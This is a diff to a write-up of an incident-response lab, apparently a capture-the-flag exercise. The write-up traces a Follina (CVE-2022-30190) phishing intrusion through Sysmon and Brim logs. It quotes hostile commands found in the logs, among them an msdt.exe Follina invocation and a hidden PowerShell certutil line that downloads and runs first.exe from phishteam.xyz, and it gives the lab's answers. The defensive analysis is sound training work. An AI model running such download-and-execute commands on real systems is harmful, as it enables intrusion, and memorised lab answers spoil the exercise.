@@ -107,12 +107,14 @@ Looking at the DNS query events (Event ID 22) just before the malicious file was
 
 To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string.
 
+<img width="829" height="755" alt="image" src="https://github.com/user-attachments/assets/49194561-df95-4688-a6ad-878ba31c79bf" />
+
 **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
 
 *Format: XXXX-XXXXX*
 > 2022-30190
 
-I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190.
+I had to search for the start of the command on Google: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190.
 
 ___
 
@@ -148,7 +150,7 @@ This is the path we found in the obfuscated string, we just had to replace $app 
 **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
 
 *Format: Remove the double quotes from the log.*
-> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
 
 Filtering for processes with `C:\Windows\explorer.exe` as their ParentImage, the last entry with ParentUser TEMPEST\benimaru shows the command we are looking for.
 
@@ -180,7 +182,7 @@ The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, 
 
 #### Task 6 Questions:
 **What is the URL of the malicious payload embedded in the document?**
-> http://phishteam.xyz/02dcf07/index.html
+> `http://phishteam.xyz/02dcf07/index.html`
 
 We have two malicious domains to look at: phishteam.xyz, and resolvecyber.xyz. We will look into both, but for this question we search for phishteam.xyz.
 
@@ -217,6 +219,12 @@ ___
 ### Task 7: Discovery - Internal Reconnaissance
 
 Now we have to decode the base64 payloads to see what the attacker has been doing.
+
+The task gives us a few tips:
+- Find network and process events connecting to the malicious domain.
+- Find network events that contain an encoded command.
+- We can use Brim to filter all packets containing the encoded string.
+- Look for endpoint enumeration commands since the attacker is already inside the machine.
 
 #### Task 7 Questions:
 **The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**
